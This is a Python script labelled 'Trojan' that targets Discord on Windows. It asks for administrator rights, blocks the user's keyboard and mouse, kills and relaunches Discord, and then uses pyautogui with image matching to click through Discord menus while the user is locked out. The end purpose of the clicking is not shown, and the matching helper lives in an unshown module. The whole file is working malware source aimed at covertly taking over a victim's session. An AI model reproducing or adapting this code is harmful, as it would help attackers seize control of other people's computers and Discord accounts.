'''Trojan'''

#Discord Imports
import os, sys, time, subprocess
import win32com.client
from glob import glob

#Mouse Imports
import ctypes
from ctypes import windll
from functions import *

#User Input 
if admin() == False : ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
if admin() == False : sys.exit(-1) 

blockInput = windll.user32.BlockInput(True)

#Close Discord
subprocess.call(["taskkill","/F","/IM","Discord.exe"])

#Open Discord
app = "Discord.lnk"
user = os.getlogin()
path = "C:\\Users\\" + str(user) + "\\Desktop\\"
discordApps = []
for root, dirs, files in os.walk(path) :
    if app in files :
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(path + app)
        discordPath = str(shortcut.Targetpath)[:int(str(shortcut.Targetpath).rindex("\\"))]
        discordFiles = glob(discordPath + "\\*" )
        for file in discordFiles :
            if "app-" in str(file) :
                discordApps.append(str(file)[int(str(shortcut.Targetpath).rindex("\\") + 1):])
                discordApps.sort()
        discordFolder = discordApps[int(len(discordApps) - 1)]
        subprocess.call(["cmd", "/c", "start", "/max", discordPath + "\\" + discordFolder + "\\Discord.exe"])
        discordOpen = False
        time.sleep(2)
        subprocess.call(["cmd", "/c", "start", "/max", discordPath + "\\" + discordFolder + "\\Discord.exe"])

#Check Discord Open
while discordOpen == False :
    if match("Discord") != False :
        discordOpen = True
time.sleep(2)
pyautogui.hotkey('win', 'up')
time.sleep(2)

#Simulate Mouse
for i in range(1,10) : 
    if i == 3 :
        for k in range(3) :
            pyautogui.press('down')
        pyautogui.press('enter')
    elif i == 4 :
        for l in range(11) :
            pyautogui.press('down')
        pyautogui.press('enter')
    elif i == 5 :
        pyautogui.moveTo(675, 250)
    elif i == 7 :
        for j in range(7) : 
            pyautogui.press('down')
        pyautogui.press('enter')
    elif i == 8 :
        pyautogui.press('down')
        pyautogui.press('enter')
    else :
        pos = match(str(i))
        if pos == False and i == 1 :
            newpos = match("1bis")
            if newpos == False : break
        elif pos != False :
            pyautogui.click(pos)

    time.sleep(0.5)

time.sleep(10)

blockInput = windll.user32.BlockInput(False)

